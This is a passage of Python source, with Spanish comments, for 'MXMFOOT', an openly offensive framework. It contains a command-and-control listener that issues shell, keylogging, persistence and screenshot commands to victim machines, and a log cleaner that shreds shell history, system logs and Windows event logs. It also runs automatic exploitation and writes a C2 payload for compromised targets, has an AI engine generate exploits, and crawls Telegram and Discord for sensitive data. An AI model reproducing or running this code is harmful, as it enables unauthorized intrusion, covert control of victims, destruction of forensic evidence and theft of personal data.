                        response = self.decrypt(conn.recv(1024))
                        print(f"{Fore.GREEN}[+] {response.get('msg')}{Style.RESET_ALL}")
                    
                    elif cmd == 'cleanup':
                        conn.send(self.encrypt({'type': 'cleanup'}))
                        response = self.decrypt(conn.recv(1024))
                        print(f"{Fore.GREEN}[+] {response.get('msg')}{Style.RESET_ALL}")
                    
                    elif cmd == 'screenshot':
                        conn.send(self.encrypt({'type': 'screenshot'}))
                        response = self.decrypt(conn.recv(1048576))  # 1MB para imagen
                        if response.get('data'):
                            filename = f"screenshot_{session}_{int(time.time())}.png"
                            with open(filename, 'wb') as f:
                                f.write(base64.b64decode(response['data']))
                            print(f"{Fore.GREEN}[+] Screenshot guardado: {filename}{Style.RESET_ALL}")
                    
                    elif cmd == 'ai_suggest':
                        conn.send(self.encrypt({'type': 'ai_suggest'}))
                        response = self.decrypt(conn.recv(1024))
                        print(f"{Fore.MAGENTA}[AI] Sugerencia: {response.get('command')}{Style.RESET_ALL}")
                    
                    elif cmd == 'exit':
                        break
                    
                    elif cmd == 'broadcast':
                        msg = input("Mensaje a broadcast: ")
                        for sid, info in self.connected_clients.items():
                            try:
                                info['conn'].send(self.encrypt({'type': 'exec', 'command': msg}))
                            except:
                                pass
                        print(f"{Fore.GREEN}[+] Broadcast enviado a {len(self.connected_clients)} clientes{Style.RESET_ALL}")
                    
                    else:
                        print(f"{Fore.RED}[-] Comando no reconocido. Usa 'help'{Style.RESET_ALL}")
                        
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
            finally:
                conn.close()
                if session in self.connected_clients:
                    del self.connected_clients[session]
        
        # Iniciar servidor
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', port))
        server.listen(10)
        
        print(f"{Fore.GREEN}[+] C2 Listener Inteligente en 0.0.0.0:{port}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Password C2: {self.password}{Style.RESET_ALL}")
        
        # Thread para monitoreo de clientes
        def monitor_clients():
            while True:
                time.sleep(30)
                current_time = time.time()
                to_remove = []
                for sid, info in self.connected_clients.items():
                    if current_time - info['last_seen'] > 300:  # 5 minutos sin actividad
                        to_remove.append(sid)
                for sid in to_remove:
                    del self.connected_clients[sid]
                    print(f"{Fore.YELLOW}[!] Cliente {sid[:8]} timeout{Style.RESET_ALL}")
        
        monitor_thread = threading.Thread(target=monitor_clients, daemon=True)
        monitor_thread.start()
        
        while True:
            conn, addr = server.accept()
            thread = threading.Thread(target=handle_client, args=(conn, addr))
            thread.daemon = True
            thread.start()
    
    def show_c2_help(self):
        """Muestra ayuda del C2"""
        help_text = f"""
{Fore.CYAN}Comandos C2 Inteligente:{Style.RESET_ALL}

{Fore.YELLOW}Gestión de sesiones:{Style.RESET_ALL}
  list                     - Listar clientes conectados
  select <session_id>      - Seleccionar sesión (por defecto la última)
  broadcast <comando>      - Enviar comando a todos los clientes

{Fore.YELLOW}Explotación y control:{Style.RESET_ALL}
  shell <comando>          - Ejecutar comando en sistema víctima
  ai_shell                 - Modo shell con análisis IA
  ai_suggest               - Obtener sugerencia de próximo comando
  keylog_start             - Iniciar keylogging
  keylog_stop              - Detener y obtener keylogs
  persistence              - Instalar persistencia
  cleanup                  - Limpiar logs automáticamente
  screenshot               - Tomar screenshot remoto

{Fore.YELLOW}Información:{Style.RESET_ALL}
  help                     - Mostrar esta ayuda
  exit                     - Cerrar sesión actual

{Fore.MAGENTA}[!] Los comandos con 'ai_' utilizan IA para análisis automático{Style.RESET_ALL}
"""
        print(help_text)

# ============================================================================
# AUTO LOG CLEANER
# ============================================================================

class AutoLogCleaner:
    """Auto-delete de logs automático"""
    
    def __init__(self):
        self.log_files = [
            '*.log', '*.log.*', '*.txt', '*.tmp',
            '~/.bash_history', '~/.zsh_history',
            '/var/log/auth.log', '/var/log/syslog',
            'C:\\Windows\\System32\\winevt\\Logs\\*.evtx',
            '*.pyc', '__pycache__'
        ]
        self.enabled = True
        self.start_cleaner()
    
    def start_cleaner(self):
        """Inicia thread de limpieza automática"""
        def cleaner_loop():
            while self.enabled:
                time.sleep(300)  # Cada 5 minutos
                self.clean_logs()
        
        thread = threading.Thread(target=cleaner_loop, daemon=True)
        thread.start()
    
    def clean_logs(self):
        """Limpia archivos de log"""
        import glob
        
        for pattern in self.log_files:
            try:
                files = glob.glob(os.path.expanduser(pattern))
                for file in files:
                    try:
                        # Sobrescribir con datos aleatorios antes de borrar
                        if os.path.exists(file):
                            with open(file, 'wb') as f:
                                f.write(os.urandom(1024 * 1024))  # 1MB de datos aleatorios
                            os.remove(file)
                            print(f"{Fore.GREEN}[+] Log limpiado: {file}{Style.RESET_ALL}")
                    except:
                        pass
            except:
                pass
        
        # Limpiar comandos de shell
        if os.name == 'posix':
            os.system('history -c && rm ~/.bash_history 2>/dev/null')
        elif os.name == 'nt':
            os.system('del /f /q %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul')
    
    def stop(self):
        """Detiene el cleaner"""
        self.enabled = False

# ============================================================================
# CLASE PRINCIPAL MXMFOOT
# ============================================================================

class MXMFOOT:
    """Clase principal de MXMFOOT - Versión AI Apocalyptic"""
    
    def __init__(self, target):
        self.target = target
        self.results = {}
        self.start_time = datetime.now()
        
        # Cargar configuración
        self.config = self.load_config()
        
        # Inicializar IA
        self.ai_engine = AIEngine(self.config.get('openai_api_key'))
        
        # Inicializar Social Media Crawler
        self.social_crawler = SocialMediaCrawler(
            telegram_api_id=self.config.get('telegram_api_id'),
            telegram_api_hash=self.config.get('telegram_api_hash'),
            discord_token=self.config.get('discord_token')
        )
        
        # Inicializar C2
        self.c2 = C2Channel()
        self.c2.set_ai_engine(self.ai_engine)
        
        # Inicializar otros módulos (importaciones dinámicas)
        self.modules = self.init_modules()
        
        # Log cleaner
        self.log_cleaner = AutoLogCleaner()
        
        # Thread pool para tareas paralelas
        self.executor = ThreadPoolExecutor(max_workers=10)
        
        print(f"{Fore.GREEN}[+] MXMFOOT AI Apocalyptic inicializado{Style.RESET_ALL}")
    
    def load_config(self):
        """Carga configuración desde archivo"""
        config_file = 'config/api_keys.json'
        default_config = {
            'openai_api_key': os.getenv('OPENAI_API_KEY', ''),
            'telegram_api_id': os.getenv('TELEGRAM_API_ID', ''),
            'telegram_api_hash': os.getenv('TELEGRAM_API_HASH', ''),
            'discord_token': os.getenv('DISCORD_TOKEN', ''),
            'shodan_api_key': os.getenv('SHODAN_API_KEY', ''),
            'github_token': os.getenv('GITHUB_TOKEN', ''),
            'c2_port': 4444,
            'auto_clean_logs': True,
            'enable_ai': True,
            'max_threads': 10
        }
        
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                default_config.update(config)
        except:
            pass
        
        return default_config
    
    def init_modules(self):
        """Inicializa módulos dinámicamente"""
        modules = {}
        
        # Importar módulos existentes
        try:
            from modules.dns_enum import DNSEnumerator
            from modules.whois_lookup import WhoisLookup
            from modules.web_scraper import WebScraper
            from modules.shodan_intel import ShodanIntel
            from modules.darkweb_scanner import DarkWebScanner
            
            modules['dns'] = DNSEnumerator()
            modules['whois'] = WhoisLookup()
            modules['web'] = WebScraper()
            modules['shodan'] = ShodanIntel(self.config.get('shodan_api_key'))
            modules['darkweb'] = DarkWebScanner()
            
            print(f"{Fore.GREEN}[+] Módulos OSINT cargados{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error cargando módulos: {e}{Style.RESET_ALL}")
        
        return modules
    
    def print_banner(self):
        """Imprime banner mamalón"""
        banner = f"""
{Fore.RED}{Style.BRIGHT}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ███╗   ███╗██╗  ██╗███╗   ███╗███████╗ ██████╗  ██████╗ ████████╗          ║
║   ████╗ ████║╚██╗██╔╝████╗ ████║██╔════╝██╔═══██╗██╔═══██╗╚══██╔══╝          ║
║   ██╔████╔██║ ╚███╔╝ ██╔████╔██║█████╗  ██║   ██║██║   ██║   ██║             ║
║   ██║╚██╔╝██║ ██╔██╗ ██║╚██╔╝██║██╔══╝  ██║   ██║██║   ██║   ██║             ║
║   ██║ ╚═╝ ██║██╔╝ ██╗██║ ╚═╝ ██║██║     ╚██████╔╝╚██████╔╝   ██║             ║
║   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝      ╚═════╝  ╚═════╝    ╚═╝             ║
║                                                                               ║
║   ███████╗ ██████╗  ██████╗ ████████╗    ██╗   ██╗██╗  ████████╗██╗███╗   ███╗║
║   ██╔════╝██╔═══██╗██╔═══██╗╚══██╔══╝    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║║
║   █████╗  ██║   ██║██║   ██║   ██║       ██║   ██║██║     ██║   ██║██╔████╔██║║
║   ██╔══╝  ██║   ██║██║   ██║   ██║       ██║   ██║██║     ██║   ██║██║╚██╔╝██║║
║   ██║     ╚██████╔╝╚██████╔╝   ██║       ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║║
║   ╚═╝      ╚═════╝  ╚═════╝    ╚═╝        ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝║
║                                                                               ║
║                    ██████╗ █████╗ ██╗     ██╗███████╗███████╗                ║
║                    ██╔══██╗██╔══██╗██║     ██║██╔════╝██╔════╝                ║
║                    ██████╔╝███████║██║     ██║█████╗  ███████╗                ║
║                    ██╔══██╗██╔══██║██║     ██║██╔══╝  ╚════██║                ║
║                    ██║  ██║██║  ██║███████╗██║██║     ███████║                ║
║                    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝     ╚══════╝                ║
║                                                                               ║
║                    {Fore.YELLOW}Versión 4.0 - AI Apocalyptic Edition{Fore.RED}                         ║
║                  {Fore.CYAN}Coded by: ElChinoMX | ZeroDay Crew{Fore.RED}                       ║
║              {Fore.GREEN}"IA + OSINT + Exploit + C2 = Aniquilación Total"{Fore.RED}               ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
        print(f"{Fore.CYAN}[+] Target: {self.target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Start Time: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] AI Engine: {'ACTIVADO' if self.config['enable_ai'] else 'DESACTIVADO'}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] C2 Port: {self.config['c2_port']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    def run_osint(self):
        """Ejecuta módulos OSINT básicos"""
        print(f"\n{Fore.BLUE}[*] Ejecutando OSINT en {self.target}{Style.RESET_ALL}")
        
        for module_name, module in self.modules.items():
            try:
                print(f"[*] Módulo: {module_name}")
                result = module.scan(self.target) if hasattr(module, 'scan') else None
                self.results[module_name] = result
            except Exception as e:
                print(f"[-] Error en {module_name}: {e}")
    
    def run_ai_exploit_generation(self):
        """Genera exploits con IA basado en hallazgos"""
        print(f"\n{Fore.MAGENTA}[🤖] Generando exploits con IA...{Style.RESET_ALL}")
        
        # Analizar vulnerabilidades encontradas
        vuln_analysis = self.ai_engine.analyze_vulnerability(self.results)
        self.results['ai_vulnerability_analysis'] = vuln_analysis
        
        # Generar exploits para vulnerabilidades críticas
        generated_exploits = []
        
        for vuln in vuln_analysis.get('vulnerabilities', []):
            if vuln.get('severity') in ['CRITICAL', 'HIGH']:
                print(f"[*] Generando exploit para: {vuln['type']}")
                
                exploit_code = self.ai_engine.generate_exploit(
                    vuln,
                    {'target': self.target, 'findings': self.results}
                )
                
                # Guardar exploit
                exploit_file = f"exploits/exploit_{vuln['type'].replace(' ', '_')}_{int(time.time())}.py"
                os.makedirs('exploits', exist_ok=True)
                with open(exploit_file, 'w') as f:
                    f.write(exploit_code)
                
                generated_exploits.append({
                    'type': vuln['type'],
                    'file': exploit_file,
                    'code': exploit_code[:200] + '...'
                })
                
                print(f"[+] Exploit guardado: {exploit_file}")
        
        self.results['ai_generated_exploits'] = generated_exploits
        
        # Sugerencias de explotación
        suggestions = self.ai_engine.auto_exploit_suggestion(self.results)
        self.results['ai_exploit_suggestions'] = suggestions
        
        print(f"{Fore.GREEN}[+] Generados {len(generated_exploits)} exploits con IA{Style.RESET_ALL}")
    
    async def run_social_crawling(self):
        """Ejecuta crawling de Telegram y Discord"""
        print(f"\n{Fore.CYAN}[💬] Iniciando crawling de redes sociales...{Style.RESET_ALL}")
        
        keywords = [self.target] + self.target.split('.')
        
        # Crawl Telegram
        if self.config.get('telegram_api_id') and self.config.get('telegram_api_hash'):
            try:
                telegram_data = await self.social_crawler.auto_crawl_telegram(keywords, max_channels=10)
                self.results['telegram_crawl'] = telegram_data
                print(f"[+] Telegram: {len(telegram_data)} canales/grupos analizados")
            except Exception as e:
                print(f"[-] Error en Telegram crawling: {e}")
        else:
            print(f"{Fore.YELLOW}[!] Telegram credentials no configuradas{Style.RESET_ALL}")
        
        # Crawl Discord
        if self.config.get('discord_token'):
            try:
                discord_data = await self.social_crawler.auto_crawl_discord(keywords, max_servers=10)
                self.results['discord_crawl'] = discord_data
                print(f"[+] Discord: {len(discord_data)} servidores analizados")
            except Exception as e:
                print(f"[-] Error en Discord crawling: {e}")
        else:
            print(f"{Fore.YELLOW}[!] Discord token no configurado{Style.RESET_ALL}")
        
        # Sensitive data encontrada
        sensitive_data = self.social_crawler.get_all_sensitive_data()
        self.results['social_sensitive_data'] = sensitive_data
        
        total_sensitive = len(sensitive_data['telegram']) + len(sensitive_data['discord'])
        if total_sensitive > 0:
            print(f"{Fore.RED}[!] Encontrados {total_sensitive} datos sensibles en redes sociales{Style.RESET_ALL}")
            
            # Guardar datos sensibles
            with open(f"reports/sensitive_data_{self.target}_{int(time.time())}.json", 'w') as f:
                json.dump(sensitive_data, f, indent=2)
    
    def run_auto_exploit(self):
        """Ejecuta auto-exploit con MSF"""
        print(f"\n{Fore.RED}[💣] Iniciando auto-exploit...{Style.RESET_ALL}")
        
        # Verificar si hay IPs en los resultados
        ip_found = None
        if 'shodan' in self.results and self.results['shodan']:
            shodan_data = self.results['shodan']
            if isinstance(shodan_data, dict):
                ip_found = shodan_data.get('host_info', {}).get('ip')
        
        if not ip_found:
            # Intentar resolver dominio
            try:
                ip_found = socket.gethostbyname(self.target)
                print(f"[*] IP resuelta: {ip_found}")
            except:
                print(f"[-] No se pudo resolver IP")
                return
        
        # Cargar módulo de exploit si está disponible
        try:
            from modules.auto_exploit import AutoExploit
            exploit_module = AutoExploit()
            
            # Escanear puertos (simplificado)
            ports = [80, 443, 22, 445, 3306, 3389, 8080]
            
            exploit_results = exploit_module.auto_exploit(ip_found, ports)
            self.results['auto_exploit'] = exploit_results
            
            if exploit_results and any(r.get('success') for r in exploit_results):
                print(f"{Fore.RED}[!] ¡Exploit exitoso! Sistema comprometido{Style.RESET_ALL}")
                
                # Generar payload C2
                payload = self.c2.create_ai_payload('0.0.0.0', self.config['c2_port'])
                payload_file = f"payloads/c2_payload_{int(time.time())}.py"
                os.makedirs('payloads', exist_ok=True)
                with open(payload_file, 'w') as f:
                    f.write(payload)
                
                print(f"{Fore.GREEN}[+] Payload C2 generado: {payload_file}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Transfiere el payload al objetivo comprometido{Style.RESET_ALL}")
                
        except ImportError:
            print(f"{Fore.YELLOW}[!] Módulo AutoExploit no disponible{Style.RESET_ALL}")
    
    def start_c2(self):
        """Inicia el C2 listener"""
        print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.RED}[🎯] INICIANDO C2 LISTENER INTELIGENTE{Style.RESET_ALL}")
        print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
        
        try:
            self.c2.start_listener(self.config['c2_port'])
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] C2 listener detenido{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error en C2: {e}{Style.RESET_ALL}")
    
    def show_summary(self):
        """Muestra resumen de hallazgos"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[📊] RESUMEN DE HALLAZGOS - IA APOCALYPTIC{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        # OSINT básico
        if 'shodan' in self.results:
            shodan_data = self.results['shodan']
            if isinstance(shodan_data, dict) and 'host_info' in shodan_data:
                print(f"\n{Fore.YELLOW}[🛡️] SHODAN:{Style.RESET_ALL}")
                print(f"    IP: {shodan_data['host_info'].get('ip', 'N/A')}")
                print(f"    Puertos: {len(shodan_data.get('open_ports', []))}")
        
        # IA Vulnerability Analysis
        if 'ai_vulnerability_analysis' in self.results:
            ai_vuln = self.results['ai_vulnerability_analysis']
            print(f"\n{Fore.MAGENTA}[🤖] IA VULNERABILITY ANALYSIS:{Style.RESET_ALL}")
            print(f"    Risk Score: {ai_vuln.get('risk_score', 0)}/100")
            print(f"    Vulnerabilidades: {len(ai_vuln.get('vulnerabilities', []))}")
            print(f"    Resumen: {ai_vuln.get('summary', 'N/A')[:100]}")
        
        # IA Generated Exploits
        if 'ai_generated_exploits' in self.results:
            exploits = self.results['ai_generated_exploits']
            print(f"\n{Fore.RED}[💣] IA GENERATED EXPLOITS:{Style.RESET_ALL}")
            for exploit in exploits:
                print(f"    • {exploit['type']} -> {exploit['file']}")
        
        # Social Media Sensitive Data
        if 'social_sensitive_data' in self.results:
            sensitive = self.results['social_sensitive_data']
            total_telegram = len(sensitive.get('telegram', []))
            total_discord = len(sensitive.get('discord', []))
            
            print(f"\n{Fore.CYAN}[💬] SOCIAL MEDIA SENSITIVE DATA:{Style.RESET_ALL}")
            print(f"    Telegram: {total_telegram} items")
            print(f"    Discord: {total_discord} items")
            
            if total_telegram + total_discord > 0:
                print(f"    {Fore.RED}[!] Datos sensibles encontrados en redes sociales{Style.RESET_ALL}")
        
        # Auto Exploit
        if 'auto_exploit' in self.results:
            exploit_results = self.results['auto_exploit']
            successful = sum(1 for e in exploit_results if e.get('success')) if exploit_results else 0
            print(f"\n{Fore.RED}[🎯] AUTO-EXPLOIT:{Style.RESET_ALL}")
            print(f"    Exploits lanzados: {len(exploit_results) if exploit_results else 0}")
            print(f"    Exitosos: {successful}")
            if successful > 0:
                print(f"    {Fore.RED}[!] ¡SISTEMA COMPROMETIDO!{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    def save_results(self):
        """Guarda resultados completos"""
        filename = f"reports/mxmfoot_ai_report_{self.target}_{self.start_time.strftime('%Y%m%d_%H%M%S')}.json"
        os.makedirs('reports', exist_ok=True)
        
        report = {
            'target': self.target,
            'timestamp': self.start_time.isoformat(),
            'duration': str(datetime.now() - self.start_time),
            'config': {k: '***REDACTED***' if 'key' in k or 'token' in k else v for k, v in self.config.items()},
            'results': self.results,
            'c2_password': self.c2.password,
            'ai_model': self.ai_engine.model if self.ai_engine.client else 'disabled'
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"\n{Fore.GREEN}[+] Reporte completo guardado: {filename}{Style.RESET_ALL}")
    
    def cleanup(self):
        """Limpieza final"""
        print(f"\n{Fore.YELLOW}[*] Realizando limpieza final...{Style.RESET_ALL}")
        
        self.log_cleaner.stop()
        self.executor.shutdown(wait=False)
        
        # Limpiar archivos temporales
        temp_patterns = ['*.pyc', '__pycache__', '*.tmp', '*.log']
        for pattern in temp_patterns:
            os.system(f'rm -rf {pattern} 2>/dev/null')
        
        print(f"{Fore.GREEN}[+] Limpieza completada{Style.RESET_ALL}")
    
    async def run_full_ai_attack(self):
        """Ejecuta ataque completo con IA"""
        print(f"\n{Fore.RED}{'💀'*50}{Style.RESET_ALL}")
        print(f"{Fore.RED}[💀] MODO APOCALÍPTICO IA - ANIQUILACIÓN TOTAL{Style.RESET_ALL}")
        print(f"{Fore.RED}{'💀'*50}{Style.RESET_ALL}")
        
        # 1. OSINT básico
        self.run_osint()
        
        # 2. Crawling redes sociales
        await self.run_social_crawling()
        
        # 3. Análisis con IA
        self.run_ai_exploit_generation()
        
        # 4. Auto-exploit
        self.run_auto_exploit()
        
        # 5. Mostrar resumen
        self.show_summary()
        
        # 6. Guardar resultados
        self.save_results()
        
        # 7. Preguntar si iniciar C2
        if 'auto_exploit' in self.results and any(r.get('success') for r in self.results['auto_exploit'] if r):
            print(f"\n{Fore.RED}[!] Se detectó acceso exitoso al objetivo{Style.RESET_ALL}")
            response = input(f"{Fore.YELLOW}¿Iniciar C2 listener? (y/n): {Style.RESET_ALL}")
            if response.lower() == 'y':
                self.start_c2()

# ============================================================================
# MAIN
# ============================================================================

async def main():
    """Función principal asíncrona"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='MXMFOOT - AI Apocalyptic OSINT Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  %(prog)s -t objetivo.com --full-ai         # Ataque completo con IA
  %(prog)s -t objetivo.com --social-crawl    # Crawling Telegram/Discord
  %(prog)s -t objetivo.com --ai-exploit      # Generación de exploits con IA
  %(prog)s --c2-listener                     # Iniciar C2 listener IA
  %(prog)s -t objetivo.com --osint-only      # Solo OSINT básico
        """
    )
    
    parser.add_argument('-t', '--target', help='Dominio, IP o email objetivo')
    parser.add_argument('--full-ai', action='store_true', help='Ataque completo con IA')
    parser.add_argument('--social-crawl', action='store_true', help='Crawling Telegram/Discord')
    parser.add_argument('--ai-exploit', action='store_true', help='Generación de exploits con IA')
    parser.add_argument('--c2-listener', action='store_true', help='Iniciar C2 listener IA')
    parser.add_argument('--osint-only', action='store_true', help='Solo OSINT básico')
    parser.add_argument('--c2-port', type=int, default=4444, help='Puerto para C2 listener')
    
    args = parser.parse_args()
    
    # Verificar argumentos
    if not args.target and not args.c2_listener:
        parser.print_help()
        print(f"\n{Fore.RED}[!] Especifica un objetivo o inicia C2 listener{Style.RESET_ALL}")
        return
    
    # Modo C2 listener
    if args.c2_listener:
        temp_mxm = MXMFOOT('0.0.0.0')
        temp_mxm.config['c2_port'] = args.c2_port
        temp_mxm.start_c2()
        return
    
    # Inicializar MXMFOOT
    mxm = MXMFOOT(args.target)
    mxm.config['c2_port'] = args.c2_port
    mxm.print_banner()
    
    try:
        if args.full_ai:
            await mxm.run_full_ai_attack()
        elif args.social_crawl:
            await mxm.run_social_crawling()
            mxm.show_summary()
            mxm.save_results()
        elif args.ai_exploit:
            mxm.run_osint()
            mxm.run_ai_exploit_generation()
            mxm.show_summary()
            mxm.save_results()
        elif args.osint_only:
            mxm.run_osint()
            mxm.show_summary()
            mxm.save_results()
        else:
            # Modo por defecto: todo
            await mxm.run_full_ai_attack()
    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupción detectada{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error fatal: {e}{Style.RESET_ALL}")
        logger.exception("Error fatal")
    finally:
        mxm.cleanup()

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
